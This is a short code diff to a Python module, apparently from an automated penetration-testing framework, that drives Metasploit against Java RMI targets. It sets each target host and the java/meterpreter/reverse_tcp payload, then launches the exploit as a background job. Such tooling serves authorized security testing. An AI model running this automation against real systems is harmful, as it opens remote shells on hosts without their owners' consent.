@@ -45,7 +45,7 @@ class msf_javarmi(actionModule):
                     msf.execute("set RHOSTS %s\n" % t)
                     msf.execute("set TARGET 0\n")
                     msf.execute("set PAYLOAD java/meterpreter/reverse_tcp\n")
-                    msf.execute("run\n")
+                    msf.execute("exploit -j\n")
                     msf.sleep(int(self.config['msfexploitdelay']))
 
                     outfile = self.config["proofsDir"] + self.shortName + "_" + t + "_" + Utils.getRandStr(10)
